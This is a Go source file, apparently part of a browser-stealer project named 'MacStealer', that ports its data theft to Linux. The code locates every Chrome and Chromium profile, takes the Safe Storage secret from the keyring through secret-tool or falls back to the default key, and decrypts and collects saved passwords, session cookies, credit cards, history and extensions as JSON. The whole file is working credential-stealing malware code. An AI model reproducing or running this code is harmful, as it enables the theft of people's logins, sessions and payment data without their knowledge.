//go:build linux

package main

import (
    "bytes"
    "crypto/sha1"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "strings"

    "github.com/ultra-supara/MacStealer/browsingdata"
    "golang.org/x/crypto/pbkdf2"
)

type LinuxBrowserDataExtractor struct{}

func getLinuxChromeBasePath() string {
    home, err := os.UserHomeDir()
    if err != nil {
        return ""
    }
    // Try standard, then snap
    std := filepath.Join(home, ".config", "google-chrome")
    if _, err := os.Stat(std); err == nil {
        return std
    }
    snap := filepath.Join(home, "snap", "chromium", "common", "chromium")
    if _, err := os.Stat(snap); err == nil {
        return snap
    }
    return std
}

func getLinuxDefaultPath(kind, profile string) string {
    base := filepath.Join(getLinuxChromeBasePath(), profile)
    switch kind {
    case "cookie":
        return filepath.Join(base, "Cookies")
    case "logindata":
        return filepath.Join(base, "Login Data")
    case "creditcard":
        return filepath.Join(base, "Web Data")
    case "history":
        return filepath.Join(base, "History")
    case "extension":
        return filepath.Join(base, "Preferences")
    default:
        return ""
    }
}

func getLinuxMasterKeyBase64() string {
    // Try secret-tool (like MachStealer does for macOS keychain)
    cmd := exec.Command("secret-tool", "lookup", "Chrome", "Safe Storage")
    out, err := cmd.Output()
    var seed []byte
    if err == nil && len(bytes.TrimSpace(out)) > 0 {
        seed = bytes.TrimSpace(out)
    } else {
        // Fallback default for Linux Chrome (peanuts) – matches Chromium Linux behavior
        seed = []byte("peanuts")
    }
    salt := []byte("saltysalt")
    key := pbkdf2.Key(seed, salt, 1, 16, sha1.New)
    if key == nil {
        return ""
    }
    return base64.StdEncoding.EncodeToString(key)
}

func listLinuxProfiles() []string {
    base := getLinuxChromeBasePath()
    entries, err := os.ReadDir(base)
    if err != nil {
        return []string{"Default"}
    }
    var profiles []string
    for _, e := range entries {
        if !e.IsDir() {
            continue
        }
        n := e.Name()
        if n == "Default" || strings.HasPrefix(n, "Profile ") {
            prefPath := filepath.Join(base, n, "Preferences")
            if _, err := os.Stat(prefPath); err == nil {
                profiles = append(profiles, n)
            }
        }
    }
    if len(profiles) == 0 {
        return []string{"Default"}
    }
    return profiles
}

func (e *LinuxBrowserDataExtractor) ExtractCookies(path string) ([]byte, error) {
    mk := getLinuxMasterKeyBase64()
    if path != "" {
        cookies, err := browsingdata.GetCookie(mk, path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract cookies: %w", err)
        }
        return json.Marshal(cookies)
    }
    var all []browsingdata.Cookie
    for _, p := range listLinuxProfiles() {
        cp := getLinuxDefaultPath("cookie", p)
        if _, err := os.Stat(cp); err != nil {
            continue
        }
        cookies, err := browsingdata.GetCookie(mk, cp)
        if err != nil {
            continue
        }
        all = append(all, cookies...)
    }
    return json.Marshal(all)
}

func (e *LinuxBrowserDataExtractor) ExtractLoginData(path string) ([]byte, error) {
    mk := getLinuxMasterKeyBase64()
    if path != "" {
        ld, err := browsingdata.GetLoginData(mk, path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract login data: %w", err)
        }
        return json.Marshal(ld)
    }
    var all []interface{}
    for _, p := range listLinuxProfiles() {
        lp := getLinuxDefaultPath("logindata", p)
        if _, err := os.Stat(lp); err != nil {
            continue
        }
        ld, err := browsingdata.GetLoginData(mk, lp)
        if err != nil {
            continue
        }
        for _, v := range ld {
            all = append(all, v)
        }
    }
    return json.Marshal(all)
}

func (e *LinuxBrowserDataExtractor) ExtractCreditCards(path string) ([]byte, error) {
    mk := getLinuxMasterKeyBase64()
    if path != "" {
        cc, err := browsingdata.GetCreditCard(mk, path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract credit cards: %w", err)
        }
        return json.Marshal(cc)
    }
    var all []browsingdata.CreditCard
    for _, p := range listLinuxProfiles() {
        cp := getLinuxDefaultPath("creditcard", p)
        if _, err := os.Stat(cp); err != nil {
            continue
        }
        cc, err := browsingdata.GetCreditCard(mk, cp)
        if err != nil {
            continue
        }
        all = append(all, cc...)
    }
    return json.Marshal(all)
}

func (e *LinuxBrowserDataExtractor) ExtractHistory(path string) ([]byte, error) {
    if path != "" {
        h, err := browsingdata.GetHistory(path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract history: %w", err)
        }
        return json.Marshal(h)
    }
    var all []browsingdata.History
    for _, p := range listLinuxProfiles() {
        hp := getLinuxDefaultPath("history", p)
        if _, err := os.Stat(hp); err != nil {
            continue
        }
        h, err := browsingdata.GetHistory(hp)
        if err != nil {
            continue
        }
        all = append(all, h...)
    }
    return json.Marshal(all)
}

func (e *LinuxBrowserDataExtractor) ExtractExtensions(path string) ([]byte, error) {
    if path != "" {
        ext, err := browsingdata.GetExtension(path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract extensions: %w", err)
        }
        return json.Marshal(ext)
    }
    var all []browsingdata.Extension
    for _, p := range listLinuxProfiles() {
        ep := getLinuxDefaultPath("extension", p)
        if _, err := os.Stat(ep); err != nil {
            continue
        }
        ext, err := browsingdata.GetExtension(ep)
        if err != nil {
            continue
        }
        all = append(all, ext...)
    }
    return json.Marshal(all)
}
